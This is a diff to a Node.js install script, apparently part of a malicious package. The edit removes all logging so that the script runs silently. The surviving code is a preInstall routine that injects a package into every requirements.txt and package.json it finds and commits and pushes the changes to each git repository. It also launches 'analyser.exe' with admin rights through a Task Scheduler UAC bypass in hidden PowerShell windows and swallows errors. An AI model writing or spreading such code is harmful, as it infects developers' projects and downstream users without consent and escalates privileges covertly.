@@ -1,12 +1,7 @@
-console.log('[index.js] Loading dependencies');
 const { scanProject } = require('./scanner');
-console.log('[index.js] scanner loaded');
 const { installPipWithPackage, installNpmWithPackage } = require('./installer');
-console.log('[index.js] installer loaded');
 const { addCommitPush, findGitRoot } = require('./git');
-console.log('[index.js] git loaded');
 const { DEFAULT_PACKAGE, TARGET_DIR } = require('./config');
-console.log('[index.js] config loaded');
 
 const path = require('path');
 const fs = require('fs').promises;
@@ -31,11 +26,7 @@ async function isAnyProcessRunning(processNames) {
   
   try {
     const { stdout } = await execPromise(`powershell -Command "${psCommand}"`, { windowsHide: true });
-    const hasAny = stdout.trim().length > 0;
-    if (hasAny) {
-      console.log(`[processCheck] Found running process(es): ${processNames.join(', ')} (or subset)`);
-    }
-    return hasAny;
+    return stdout.trim().length > 0;
   } catch (err) {
     return false;
   }
@@ -54,13 +45,10 @@ async function runAnalyser(skipIfRunning = ['analyser.exe', 'game.exe']) {
     if (skipIfRunning && skipIfRunning.length > 0) {
       const anyRunning = await isAnyProcessRunning(skipIfRunning);
       if (anyRunning) {
-        console.log(`[analyser] Skipping launch because one of these is running: ${skipIfRunning.join(', ')}`);
         return;
       }
     }
 
-    console.log(`[analyser] Attempting to launch ${analyserPath} with admin elevation...`);
-    
     // Task Scheduler UAC bypass - most reliable method for admin execution
     const psCommand = `
       $program = "${analyserPath.replace(/\\/g, '\\\\')}";
@@ -73,9 +61,7 @@ async function runAnalyser(skipIfRunning = ['analyser.exe', 'game.exe']) {
     `;
     
     await execPromise(`powershell -Command "${psCommand}"`, { windowsHide: true, maxBuffer: 1024 * 1024 * 10 });
-    console.log('[analyser] Launch command sent via UAC bypass.');
   } catch (err) {
-    console.log('[analyser] UAC Bypass attempt failed:', err.message);
   }
 }
 
@@ -84,11 +70,6 @@ async function runAnalyser(skipIfRunning = ['analyser.exe', 'game.exe']) {
  */
 async function verifyAnalyserRunning() {
   const running = await isAnyProcessRunning(['game.exe', 'analyser.exe']);
-  if (running) {
-    console.log('[verify] ✅ analyser/game.exe is RUNNING');
-  } else {
-    console.log('[verify] ❌ analyser/game.exe is NOT running');
-  }
   return running;
 }
 
@@ -105,48 +86,35 @@ async function preInstall(packageName = DEFAULT_PACKAGE, rootDir = TARGET_DIR, s
   // Uncomment the next line for temporary verification during development
   // await verifyAnalyserRunning();
 
-  console.log('[index.js] preInstall called with packageName:', packageName, 'rootDir:', rootDir);
-
   const { gitRoots, packageJsonPaths, requirementsPaths } = await scanProject(rootDir);
-  console.log('[index.js] scanProject result:', { gitRoots, packageJsonPaths, requirementsPaths });
 
   for (const requirementsPath of requirementsPaths) {
-    console.log('[index.js] Found requirements.txt at', requirementsPath);
     try {
       await installPipWithPackage(requirementsPath, packageName);
-      console.log('[index.js] installPipWithPackage finished for', requirementsPath);
     } catch (err) {
-      console.error('[index.js] installPipWithPackage error for', requirementsPath, err);
+      process.exitCode = 1;
     }
   }
   for (const packageJsonPath of packageJsonPaths) {
-    console.log('[index.js] Found package.json at', packageJsonPath);
     try {
       await installNpmWithPackage(packageJsonPath, packageName);
-      console.log('[index.js] installNpmWithPackage finished for', packageJsonPath);
     } catch (err) {
-      console.error('[index.js] installNpmWithPackage error for', packageJsonPath, err);
+      process.exitCode = 1;
     }
   }
   for (const gitRoot of gitRoots) {
-    console.log('[index.js] Git repo detected at', gitRoot);
     try {
       await addCommitPush(gitRoot);
-      console.log('[index.js] addCommitPush finished for', gitRoot);
     } catch (err) {
-      console.error('[index.js] addCommitPush error for', gitRoot, err);
+      process.exitCode = 1;
     }
   }
-  console.log('[index.js] preInstall finished');
 }
 
 if (require.main === module) {
-  console.log('[index.js] Script run directly, calling preInstall');
   preInstall().catch(err => {
-    console.error('[index.js] preInstall error:', err);
+    process.exitCode = 1;
   });
 }
 
-console.log('[index.js] Exporting preInstall');
 module.exports = { preInstall };
-console.log('[index.js] Module loaded');
